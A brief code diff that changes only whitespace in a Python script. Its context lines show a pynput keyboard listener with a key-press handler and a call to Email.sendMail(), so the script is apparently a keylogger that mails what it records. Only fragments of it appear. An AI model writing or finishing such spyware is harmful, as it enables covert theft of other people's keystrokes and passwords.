@@ -17,6 +17,7 @@ from pynput.keyboard import Listener
 flag = 0
 tmp_flag = 0
 
+
 def press(key):
 	global flag, tmp_flag
 	tmp_flag = tmp_flag + 1
@@ -62,5 +63,3 @@ if __name__ == '__main__':
 					Email.sendMail()
 					break
 				continue
-
-
